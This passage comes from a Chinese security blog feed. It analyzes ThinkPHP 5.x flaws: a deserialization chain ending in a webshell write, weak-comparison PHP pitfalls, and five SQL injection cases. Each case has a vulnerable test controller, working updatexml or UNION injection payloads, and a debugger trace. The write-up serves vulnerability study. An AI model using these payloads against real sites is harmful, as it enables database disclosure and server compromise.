class="line">Windows类的__destruct()--&gt;removeFiles()--&gt;Model类的__tostring()--&gt;toJson()--&gt;toArray()--&gt;Output类的__call()--&gt;block()--&gt;writeln()--&gt;write()--&gt;Memcache类的write()--&gt;File类的set()--&gt;Driver类的setTagItem()--&gt;File类的set()--&gt;file_put_contents写入shell</span><br></pre></td></tr></table></figure><p>最后执行效果如图所示</p><p><img src="/post/e1d073c2/image-20240315142812185.png" alt="image-20240315142812185" style="zoom: 25%;"></p>]]></content>
    
    
    <summary type="html">&lt;h4 id=&quot;thinkphp5_x反序列化&quot;&gt;Thinkphp5_x（反序列化）&lt;/h4&gt;</summary>
    
    
    
    <category term="安全" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Thinkphp5_x（不包含反序列化）</title>
    <link href="http://example.com/post/96d74354.html"/>
    <id>http://example.com/post/96d74354.html</id>
    <published>2024-03-03T06:10:23.000Z</published>
    <updated>2024-09-28T16:17:20.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="thinkphp5_x不包含反序列化">Thinkphp5_x（不包含反序列化）</h4><p>参考链接：https://github.com/lu2ker/PHP-Code</p><span id="more"></span><h5 id="可能被利用的函数">可能被利用的函数</h5><h6 id="array_search">array_search()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_search</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span>=<span class="literal">false</span> ) <span class="comment"># 在数组中搜索给定值，如果成功则返回第一个对应的键。</span></span><br></pre></td></tr></table></figure><p>如果第三个参数没有主动设置为true(默认为false)，则有绕过的可能性。</p><p>如果为false则进行弱比较匹配（不比较类型），意味着 PHP会在进行比较时进行弱类型转换。在某些情况下，这种类型转换可能会导致意外的结果，从而引发漏洞。</p><p>例如，在某些情况下，<code>array_search()</code>可能会在搜索字符串时将字符串与数字进行比较。如果字符串的内容可以被解释为数字，则PHP将尝试将其转换为数字，并将其视为相等。这种行为可能被恶意利用，导致安全漏洞。</p><h6 id="in_array">in_array()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">in_array</span> ( <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">array</span> <span class="variable">$haystack</span> , <span class="keyword">bool</span> <span class="variable">$strict</span> = <span class="literal">false</span> ) : <span class="keyword">bool</span>  <span class="comment">#检查数组中是否存在某个值</span></span><br></pre></td></tr></table></figure><p>当in_array()函数的第三个参数未设置为true时（默认为false），会进行弱比较，可能会引发漏洞</p><h6 id="filter_var">filter_var()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>( <span class="keyword">mixed</span> <span class="variable">$value</span>, <span class="keyword">int</span> <span class="variable">$filter</span> = FILTER_DEFAULT, <span class="keyword">array</span>|<span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span>) : <span class="keyword">mixed</span> <span class="comment"># 使用特定的过滤器过滤一个变量。</span></span><br></pre></td></tr></table></figure><p><code>FILTER_VALIDATE_URL</code> 过滤器把<code>$value</code>作为 URL来验证，验证其是否是URL格式的字符串，但是有一个很大的问题是这个过滤器的”宽容性很高“，类似于<code>qwe://</code>这种形式的URL都可以通过它的过滤。</p><p>经过一些测试发现，形如<code>xxx://xxx</code>即可验证通过该过滤器。但是如果前半部分是<code>http://</code>的话，正斜杠后边不允许有特殊字符了。比如<code>http://&gt;&lt;"";''</code>是不行的但是<code>qwe://&gt;&lt;"";''</code>确实可以通过过滤的。</p><h6 id="class_exists">class_exists()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">class_exists</span> ( <span class="keyword">string</span> <span class="variable">$class</span> , <span class="keyword">bool</span> <span class="variable">$autoload</span> = <span class="literal">true</span> ) : <span class="keyword">bool</span> <span class="comment"># 检查指定的类是否已定义。$autoload是是否默认调用__autoload函数。</span></span><br></pre></td></tr></table></figure><p>自动包含漏洞，可以使用<code>../</code>路径穿越来实现任意文件包含。但是，只有在<strong>PHP5~5.3（含）中才可以在<code>class_exists()</code>中传入<code>../</code>达到目的，高版本php中向<code>class_exists</code>中传入<code>../</code>是不会调用</strong><code>__autoload()</code>的。</p><h6 id="strpos">strpos()</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span> ( <span class="keyword">string</span> <span class="variable">$haystack</span> , <span class="keyword">mixed</span> <span class="variable">$needle</span> , <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span> ) : <span class="keyword">int</span> <span class="comment"># 返回 needle 在 haystack 中首次出现的数字位置。如果提供了$offset，搜索会从字符串该字符数的起始位置开始统计。如果是负数，搜索会从字符串结尾指定字符数开始。</span></span><br></pre></td></tr></table></figure><p>返回的是int而不是bool，因此如果数字位置是0则效果和false一样</p><h6 id="escapeshellarg和escapeshellcmd">escapeshellarg()和escapeshellcmd()</h6><p>...</p><h4 id="下载安装">下载安装</h4><h6 id="composer安装">composer安装</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -sS https://getcomposer.org/installer | php</span><br><span class="line">mv composer.phar /usr/local/bin/composer</span><br><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/  </span><br></pre></td></tr></table></figure><h5 id="sql1">sql1</h5><h6 id="环境">环境</h6><p>thinkphp5.0.15下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.15 tp5</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.15&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">insert</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><h6 id="代码分析">代码分析</h6><p>从代码本身上应该是获取username参数然后插入到数据库中，最后返回更新成功结果</p><p><img src="/post/96d74354/image-20240304140856119.png" alt="image-20240304140856119" style="zoom:33%;"></p><p>先随便传入一个参数分析代码执行过程</p><p>首先是调用get方法，如果this-&gt;get参数为空就将获取到的get参数传递给this-&gt;get，然后判断name是否为数组，这里的name不是数组，会进入到下面的input函数</p><p><img src="/post/96d74354/image-20240304141537693.png" alt="image-20240304141537693" style="zoom:33%;"></p><p>在该函数中，将username按照了/进行分割，name为username，type为a</p><p><img src="/post/96d74354/image-20240304141630796.png" alt="image-20240304141630796" style="zoom:33%;"></p><p>在下面代码中进行了类型检查和强制数组类型转换，各type含义如下：<img src="/post/96d74354/image-20210831142915046.png" alt="image-20210831142915046" style="zoom: 25%;"></p><p><img src="/post/96d74354/image-20240304141851612.png" alt="image-20240304141851612" style="zoom:50%;"></p><p>由此返回的username参数就是get获取到的参数的数组形式</p><p><img src="/post/96d74354/image-20240304142040564.png" alt="image-20240304142040564" style="zoom:33%;"></p><p>然后进入数据库的插入函数，data进行了合并数组，结果还是之前的[username:["hello"]]，这里我发现返回的sql结果是0，进入该函数分析</p><p><img src="/post/96d74354/image-20240304142457991.png" alt="image-20240304142457991" style="zoom:33%;"></p><p>查看这里的insert函数，首先进行了解析数据，这里data就直接返回空了，查看该函数</p><p><img src="/post/96d74354/image-20240304142712277.png" alt="image-20240304142712277" style="zoom:33%;"></p><p>这里的val就是data转换为list形式，没有键，即["hello"]，因此此处的比较无法通过，最后返回的就是空</p><p><img src="/post/96d74354/image-20240304142959506.png" alt="image-20240304142959506" style="zoom:33%;"></p><p>因此重新传入危险参数，再次调试到该步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1</span><br></pre></td></tr></table></figure><p>此时的val就是长度为3的数组，第二个参数是很常见的报错注入</p><p><img src="/post/96d74354/image-20240304143310307.png" alt="image-20240304143310307" style="zoom: 50%;"></p><p>传递后的结果如图所示，主要是此处的<strong>parseKey没有对变量值进行有效过滤</strong></p><p><img src="/post/96d74354/image-20240304143438165.png" alt="image-20240304143438165" style="zoom: 25%;"></p><p>最后返回的结果相当于把username作为的是列名字，后面的参数是要插入的值，最后返回的sql语句如下</p><p><img src="/post/96d74354/image-20240304143624757.png" alt="image-20240304143624757" style="zoom: 25%;"></p><p>因此引发报错注入，会显示用户</p><p><img src="/post/96d74354/image-20240304143930652.png" alt="image-20240304143930652" style="zoom:50%;"></p><h5 id="sql2">sql2</h5><h6 id="环境-1">环境</h6><p>thinkphp5.0.15下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.7&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-1">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;<span class="title function_ invoke__">update</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>]);</span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]);  上一份测试代码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]=0</span><br></pre></td></tr></table></figure><h6 id="代码分析-1">代码分析</h6><p>通过观察可以看到前面获取username方法是一样的，主要分析此处的where函数，但从该语句的格式应该是更新id为1处的username为获取到的参数</p><p>用payload进行调试，可以看到此时的this就是传入的参数的内容</p><p><img src="/post/96d74354/image-20240304164237002.png" alt="image-20240304164237002" style="zoom: 25%;"></p><p>那sql代码的执行应该就是在下面的update函数里面，通过查看该函数内容，可以看到sql语句生成过程</p><p><img src="/post/96d74354/image-20240304164459903.png" alt="image-20240304164459903" style="zoom:33%;"></p><p>在此处的parsedata应该就是对传入的username进行过滤清洗转换为可用形式</p><p><img src="/post/96d74354/image-20240304164641551.png" alt="image-20240304164641551" style="zoom:33%;"></p><p>在parseData函数里面的parseArrayData就是清洗的具体函数，用于解析数组形式的数据并返回相应的数据库查询语句片段，首先获取data的第一二个参数给type和value，fun是第三个参数，point是第四个参数，然后进行重新组合，会生成类似于<code>'GeomFromText('POINT(x y)')'</code>的字符串。而该函数本身的用意是将坐标 <code>(x, y)</code> 转换成几何点的MySQL函数调用，在此处我们通过构造poc替代这里的函数，使得最后生成的函数是我们的报错注入的内容</p><p><img src="/post/96d74354/image-20240304164943983.png" alt="image-20240304164943983" style="zoom:25%;"></p><p>生成result之后后面就会拼接成sql语句，然后执行，最后实现报错注入</p><p><img src="/post/96d74354/image-20240304165616979.png" alt="image-20240304165616979" style="zoom: 25%;"></p><h5 id="sql3">sql3</h5><h6 id="环境-2">环境</h6><p>thinkphp5.0.10下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-2">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;exp&#x27;</span>,<span class="variable">$username</span>)-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="comment">// $username = request()-&gt;get(&#x27;username/a&#x27;);</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where([&#x27;id&#x27; =&gt; 1])-&gt;update([&#x27;username&#x27; =&gt; $username]);  上一份代码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;select success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?username==updatexml(1,concat(0x7,database(),0x7e),1)</span><br></pre></td></tr></table></figure><h6 id="代码分析-2">代码分析</h6><p>首先看到此处已经不是username/a，说明可能强制数组类型转换，先随便传入参数进行调试分析，有此处看到由于前面传入的没有/a，所以此处type会被设置为s，s是强制转换为字符串类型</p><p><img src="/post/96d74354/image-20240304171009653.png" alt="image-20240304171009653" style="zoom:33%;"></p><p>下面返回之前进行强制字符串类型转换，该处的data就是返回的username</p><p><img src="/post/96d74354/image-20240304171137773.png" alt="image-20240304171137773" style="zoom:33%;"></p><p>接着分析第二段代码</p><p><img src="/post/96d74354/image-20240304171300752.png" alt="image-20240304171300752" style="zoom:33%;"></p><p>这是前面流程基本一致，这是生成的sql函数</p><p><img src="/post/96d74354/image-20240304171700471.png" alt="image-20240304171700471" style="zoom:33%;"></p><p>此处就是单纯对sql语句进行了拼接，应该没有检查，通过添加等号就可以看到可以成功执行了</p><p><img src="/post/96d74354/image-20240304172025040.png" alt="image-20240304172025040" style="zoom:33%;"></p><p>因此还是可以通过报错注入做</p><p><img src="/post/96d74354/image-20240304172147665.png" alt="image-20240304172147665" style="zoom:33%;"></p><h5 id="sql4">sql4</h5><h6 id="环境-3">环境</h6><p>thinkphp5.0.10下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.10 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.4.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.10&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-3">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>])-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="comment">// $username = request()-&gt;get(&#x27;username&#x27;);</span></span><br><span class="line">        <span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where(&#x27;username&#x27;,&#x27;exp&#x27;,$username)-&gt;select();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=233&amp;username[2]=)%20union%20select%201,user()%23</span><br></pre></td></tr></table></figure><h6 id="代码分析-3">代码分析</h6><p>直接根据payload调试代码理解代码执行过程</p><p>$username还是数组形式，直接分析result代码，代码执行过程就是db-&gt;where-&gt;select，前面两个和传入的参数关系不大，这里直接分析select函数，跳转到此处的sql之前我们传入的参数并没有被使用，这里的options包含了我们传入的参数的内容</p><p><img src="/post/96d74354/image-20240304202814176.png" alt="image-20240304202814176" style="zoom: 25%;"></p><p>在select函数中主要是通过获取各参数值进行sql语句的生成，我们主要关注和payload有关的where</p><p><img src="/post/96d74354/image-20240304203016264.png" alt="image-20240304203016264" style="zoom:25%;"></p><p>如下所示，先进入buildwhere函数</p><p><img src="/post/96d74354/image-20240304203328509.png" alt="image-20240304203328509" style="zoom:25%;"></p><p>最后返回的wherestr和此处的str有关，继续查看相关函数</p><p><img src="/post/96d74354/image-20240304203447389.png" alt="image-20240304203447389" style="zoom:33%;"></p><p>在此处将第一个和第二个参数分别赋值给了exp和value</p><p><img src="/post/96d74354/image-20240304203531585.png" alt="image-20240304203531585" style="zoom:33%;"></p><p>后面会检查value是否为标量，如果是就会重新对value赋值，而我们此处的value是数组，还有后面对exp的过滤，发现少了notlike</p><p><img src="/post/96d74354/image-20240304203711608.png" alt="image-20240304203711608" style="zoom:25%;"></p><p>接着进行模糊匹配</p><p><img src="/post/96d74354/image-20240304203820209.png" alt="image-20240304203820209" style="zoom:33%;"></p><p>生成以下内容</p><p><img src="/post/96d74354/image-20240304204019513.png" alt="image-20240304204019513" style="zoom:25%;"></p><p>最后的wherestr如图所示</p><p><img src="/post/96d74354/image-20240304204410583.png" alt="image-20240304204410583" style="zoom:25%;"></p><p>最后构造出的sql语句</p><p><img src="/post/96d74354/image-20240304204538559.png" alt="image-20240304204538559" style="zoom: 50%;"></p><p>最终执行效果</p><p><img src="/post/96d74354/image-20240304204944556.png" alt="image-20240304204944556" style="zoom:33%;"></p><h5 id="sql5">sql5</h5><h6 id="环境-4">环境</h6><p>thinkphp5.1.22下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.1.22 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;require&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;php&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&gt;=5.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.1.22&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>同目录下执行<code>composer update</code></p><h6 id="测试代码-4">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$orderby</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">db</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;mochazz&#x27;</span>])-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$orderby</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/public/index.php?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1</span><br></pre></td></tr></table></figure><h6 id="代码分析-4">代码分析</h6><p>在本项目中传入的是orderby参数，并且是通过数组赋值的方式进行传递的，通过get方法理解orderby参数获取</p><p><img src="/post/96d74354/image-20240304211101722.png" alt="image-20240304211101722" style="zoom:33%;"></p><p>传递进的orderby如图所示</p><p><img src="/post/96d74354/image-20240304211201542.png" alt="image-20240304211201542" style="zoom: 50%;"></p><p>通过getdata变成字符串数组</p><p><img src="/post/96d74354/image-20240304211338857.png" alt="image-20240304211338857" style="zoom:33%;"></p><p>最后返回给orderby参数的值为</p><p><img src="/post/96d74354/image-20240304211444960.png" alt="image-20240304211444960" style="zoom: 25%;"></p><p>现在进入下面sql执行过程，在order函数中将传入的orderby参数给了order</p><p><img src="/post/96d74354/image-20240304211737867.png" alt="image-20240304211737867" style="zoom: 25%;"></p><p>然后将options传递给connection的find方法</p><p><img src="/post/96d74354/image-20240304211843131.png" alt="image-20240304211843131" style="zoom: 50%;"></p><p>如下是根据payload生成的order参数</p><p><img src="/post/96d74354/image-20240304212627585.png" alt="image-20240304212627585" style="zoom:25%;"></p><p>生成的sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> `users` <span class="keyword">WHERE</span>  `username` <span class="operator">=</span> :where_AND_username <span class="keyword">ORDER</span> <span class="keyword">BY</span> `id`<span class="operator">|</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>),<span class="number">1</span>)#` LIMIT <span class="number">1</span>  </span><br></pre></td></tr></table></figure><p>最终效果</p><p><img src="/post/96d74354/image-20240304212908802.png" alt="image-20240304212908802" style="zoom:33%;"></p><h5 id="sql6">sql6</h5><h6 id="环境-5">环境</h6><p>沿用上文环境</p><h6 id="测试代码-5">测试代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span 